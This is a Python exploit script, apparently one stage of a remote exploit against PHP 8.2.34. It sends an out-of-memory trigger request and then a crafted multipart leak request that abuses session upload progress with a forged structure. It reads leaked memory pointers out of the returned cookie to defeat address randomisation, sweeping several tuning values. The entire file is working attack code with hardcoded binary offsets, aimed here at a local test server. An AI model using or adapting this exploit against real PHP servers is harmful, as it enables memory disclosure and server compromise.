"""Fire the stage-1 OOM trigger + leak request on 8.2.34, capture the leak-request cookie."""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18111/"
SID = E.SID

def run_stage1(n, verbose=True):
    t = E.Target(URL, timeout=90.0, verbose=False)
    ex = E.Exploit(t, "id", zif_offset=0x39b8a0, dtor_offset=0x487650,
                   htdata_offset=0x690d8, huge_mb=12, verbose=False, profile="bookworm")
    ex.stage1_n = n
    ex.rotate()
    time.sleep(0.3)

    # Request 1: OOM trigger
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    try:
        t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception as e:
        if verbose: print(f"  [OOM req err] {e}", flush=True)
    time.sleep(0.3)

    # Request 2: leak request
    parts = [
        {"name": "PHPSESSID", "data": SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})

    resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    raw = E.parse_cookie(resp)
    if verbose:
        print(f"  n={n}: cookie len={len(raw)}", flush=True)
        if len(raw) >= 16:
            c = Counter()
            for i in range(0, len(raw) - 8, 8):
                v = int.from_bytes(raw[i:i + 8], "little")
                if 0x700000000000 <= v < 0x800000000000:
                    c[v & ~0x1FFFFF] += 1
            if c:
                top = c.most_common(3)
                print(f"    2MB-aligned: {[(hex(k), v) for k, v in top]}", flush=True)
            print(f"    first 96B: {raw[:96].hex()}", flush=True)
    return raw

# Try a range of stage1_n values
print("=== stage-1 leak request sweep (n = stage1_n) ===", flush=True)
for n in [800, 820, 841, 860, 880, 900, 920, 940]:
    raw = run_stage1(n)
    time.sleep(0.5)
